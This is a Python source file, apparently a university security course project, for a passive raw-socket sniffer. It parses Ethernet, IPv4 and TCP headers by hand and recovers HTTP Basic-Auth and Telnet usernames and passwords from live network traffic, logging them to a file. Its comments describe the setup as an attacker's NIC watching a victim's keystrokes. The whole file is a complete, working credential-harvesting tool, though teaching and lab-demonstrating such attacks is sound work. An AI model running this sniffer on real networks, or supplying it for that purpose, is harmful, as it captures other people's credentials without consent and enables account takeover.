#!/usr/bin/env python3
"""
Passive packet sniffer for CSE406 (Group 10): extracts HTTP Basic-Auth and
Telnet clear-text credentials from live traffic.

Implementation notes (per the design report):
  - Uses a raw AF_PACKET socket only. No pcap/scapy/third-party libraries.
  - All Ethernet/IPv4/TCP header parsing is done by hand with `struct`,
    following RFC 894 (Ethernet II), RFC 791 (IPv4) and RFC 793 (TCP).
  - Purely passive: never sends a packet.

Usage:
    sudo python3 sniffer.py <interface>

Requires root (or CAP_NET_RAW) because it opens a raw socket and needs the
interface in promiscuous mode.
"""

import base64
import re
import socket
import struct
import sys
import time
from datetime import datetime

ETH_HEADER_LEN = 14
ETH_P_IP = 0x0800
IPPROTO_TCP = 6

# AF_PACKET packet type (sockaddr_ll sll_pkttype). On loopback the same host is
# both sender and receiver, so every frame is delivered to the raw socket twice:
# once as PACKET_OUTGOING (the copy being sent) and once as PACKET_HOST (the
# looped-back copy). Counting both doubles per-keystroke Telnet bytes into
# "bboobb". A real attacker NIC only ever *receives* mirrored traffic, so it
# never sees PACKET_OUTGOING -- skipping it here makes the local loopback smoke
# test behave exactly like the VM demo.
PACKET_OUTGOING = 4

# Defaults match the real protocols (RFC-assigned ports). Overridable via CLI
# args so this same tool can be pointed at non-privileged ports (e.g. 8080 /
# 2323) for a local smoke test where the demo server/telnet stand-in aren't
# run as root -- see docs/RUNNING.md Part A.
HTTP_PORT = 80
TELNET_PORT = 23

LOG_PATH = "sniffer_session.log"


def mac_to_str(raw_mac: bytes) -> str:
    return ":".join(f"{b:02x}" for b in raw_mac)


def parse_ethernet(frame: bytes):
    """Return (dst_mac, src_mac, ethertype, payload) or None if too short."""
    if len(frame) < ETH_HEADER_LEN:
        return None
    dst_mac, src_mac, ethertype = struct.unpack("!6s6sH", frame[:ETH_HEADER_LEN])
    return mac_to_str(dst_mac), mac_to_str(src_mac), ethertype, frame[ETH_HEADER_LEN:]


def parse_ipv4(packet: bytes):
    """Return (src_ip, dst_ip, protocol, header_len, payload) or None."""
    if len(packet) < 20:
        return None
    ver_ihl = packet[0]
    ihl = (ver_ihl & 0x0F) * 4  # IHL is in 32-bit words
    if ihl < 20 or len(packet) < ihl:
        return None
    (_ver_ihl, _tos, _total_len, _ident, _flags_frag,
     _ttl, protocol, _checksum, src_ip, dst_ip) = struct.unpack(
        "!BBHHHBBH4s4s", packet[:20]
    )
    src_ip_str = socket.inet_ntoa(src_ip)
    dst_ip_str = socket.inet_ntoa(dst_ip)
    return src_ip_str, dst_ip_str, protocol, ihl, packet[ihl:]


def parse_tcp(segment: bytes):
    """Return (src_port, dst_port, flags, header_len, payload) or None."""
    if len(segment) < 20:
        return None
    (src_port, dst_port, _seq, _ack, offset_reserved_flags,
     flags, _window, _checksum, _urg) = struct.unpack(
        "!HHLLBBHHH", segment[:20]
    )
    data_offset = (offset_reserved_flags >> 4) * 4  # in 32-bit words
    if data_offset < 20 or len(segment) < data_offset:
        return None
    return src_port, dst_port, flags, data_offset, segment[data_offset:]


class ConnState:
    """Per-TCP-connection buffer used to reassemble credentials that may be
    split across multiple frames (HTTP headers, Telnet per-keystroke bytes)."""

    def __init__(self):
        self.http_buf = b""
        self.telnet_buf = b""
        self.telnet_stage = "login"  # "login" -> "password" -> "done"
        self.telnet_username = None
        self.reported = False


connections: dict[tuple, ConnState] = {}


def conn_key(src_ip, src_port, dst_ip, dst_port):
    """Undirected key so both directions of a connection share one buffer."""
    a = (src_ip, src_port)
    b = (dst_ip, dst_port)
    return (a, b) if a < b else (b, a)


def log(line: str):
    print(line)
    with open(LOG_PATH, "a") as f:
        f.write(line + "\n")


AUTH_RE = re.compile(rb"Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)", re.IGNORECASE)


def handle_http(state: ConnState, direction: str, payload: bytes, meta: str):
    if direction != "to_server" or not payload:
        return
    state.http_buf += payload
    # Cap buffer growth; HTTP headers are small.
    if len(state.http_buf) > 8192:
        state.http_buf = state.http_buf[-8192:]

    match = AUTH_RE.search(state.http_buf)
    if match and not state.reported:
        b64_cred = match.group(1)
        try:
            decoded = base64.b64decode(b64_cred).decode(errors="replace")
        except Exception:
            decoded = "<decode error>"
        state.reported = True
        log(f"[{meta}] *** HTTP credentials recovered: {decoded} ***")


TELNET_LOGIN_PROMPT = re.compile(rb"login:\s*$", re.IGNORECASE)
TELNET_PASSWORD_PROMPT = re.compile(rb"password:\s*$", re.IGNORECASE)

IAC = 255  # Telnet IAC (RFC 854): option-negotiation bytes (both the
# server's requests and the client's own replies) are interleaved with the
# real login/password keystrokes on the wire. Strip them before matching
# prompts or extracting credential text, or they leak into the captured
# username/password as garbage bytes.


def strip_iac(data: bytes) -> bytes:
    clean = bytearray()
    i = 0
    while i < len(data):
        if data[i] == IAC and i + 1 < len(data):
            # WILL/WONT/DO/DONT (0xFB-0xFE) carry one option byte; other
            # IAC commands (or a truncated sequence) are just 2 bytes.
            skip = 3 if 251 <= data[i + 1] <= 254 and i + 2 < len(data) else 2
            i += skip
        else:
            clean.append(data[i])
            i += 1
    return bytes(clean)


def handle_telnet(state: ConnState, direction: str, payload: bytes, meta: str):
    payload = strip_iac(payload)
    if not payload or state.telnet_stage == "done":
        return

    if direction == "to_client":
        # Server output: watch for the login/password prompts so we know
        # what the victim's next keystrokes mean.
        if TELNET_PASSWORD_PROMPT.search(payload):
            state.telnet_stage = "password"
            state.telnet_buf = b""
        elif TELNET_LOGIN_PROMPT.search(payload):
            state.telnet_stage = "login"
            state.telnet_buf = b""
        return

    # direction == "to_server": victim keystrokes, often one byte per frame.
    state.telnet_buf += payload
    if b"\r" not in state.telnet_buf and b"\n" not in state.telnet_buf:
        return

    line = state.telnet_buf.split(b"\r")[0].split(b"\n")[0]
    text = line.decode(errors="replace").strip()
    state.telnet_buf = b""

    if state.telnet_stage == "login" and text:
        state.telnet_username = text
        log(f"[{meta}] Telnet username captured: {text}")
    elif state.telnet_stage == "password" and text:
        state.telnet_stage = "done"
        log(
            f"[{meta}] *** Telnet credentials recovered: "
            f"{state.telnet_username}:{text} ***"
        )


def main():
    global HTTP_PORT, TELNET_PORT
    if len(sys.argv) not in (2, 4):
        print(
            f"Usage: sudo python3 {sys.argv[0]} <interface> [http_port telnet_port]\n"
            f"  (ports default to 80/23; pass e.g. 8080 2323 for a local "
            f"non-root smoke test)",
            file=sys.stderr,
        )
        sys.exit(1)
    iface = sys.argv[1]
    if len(sys.argv) == 4:
        HTTP_PORT = int(sys.argv[2])
        TELNET_PORT = int(sys.argv[3])

    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
        sock.bind((iface, 0))
    except PermissionError:
        print("Must run as root (raw sockets require CAP_NET_RAW).", file=sys.stderr)
        sys.exit(1)
    except OSError as e:
        print(f"Failed to open/bind raw socket on {iface}: {e}", file=sys.stderr)
        sys.exit(1)

    log(f"--- sniffer started on {iface} at {datetime.now().isoformat()} ---")

    while True:
        frame, addr = sock.recvfrom(65535)
        # addr = (ifname, proto, pkttype, hatype, hwaddr); skip our own outgoing
        # copies so loopback capture matches a real receive-only attacker NIC.
        if addr[2] == PACKET_OUTGOING:
            continue

        eth = parse_ethernet(frame)
        if eth is None:
            continue
        dst_mac, src_mac, ethertype, ip_packet = eth
        if ethertype != ETH_P_IP:
            continue

        ip = parse_ipv4(ip_packet)
        if ip is None:
            continue
        src_ip, dst_ip, protocol, _ihl, tcp_segment = ip
        if protocol != IPPROTO_TCP:
            continue

        tcp = parse_tcp(tcp_segment)
        if tcp is None:
            continue
        src_port, dst_port, _flags, _doff, payload = tcp

        if HTTP_PORT not in (src_port, dst_port) and TELNET_PORT not in (src_port, dst_port):
            continue

        ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        proto_name = "HTTP" if HTTP_PORT in (src_port, dst_port) else "TELNET"
        meta = (
            f"{ts} {proto_name} {src_mac}/{src_ip}:{src_port} -> "
            f"{dst_mac}/{dst_ip}:{dst_port}"
        )
        log(meta)

        if not payload:
            continue

        key = conn_key(src_ip, src_port, dst_ip, dst_port)
        state = connections.setdefault(key, ConnState())

        if proto_name == "HTTP":
            direction = "to_server" if dst_port == HTTP_PORT else "to_client"
            handle_http(state, direction, payload, meta)
        else:
            direction = "to_server" if dst_port == TELNET_PORT else "to_client"
            handle_telnet(state, direction, payload, meta)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopped.")
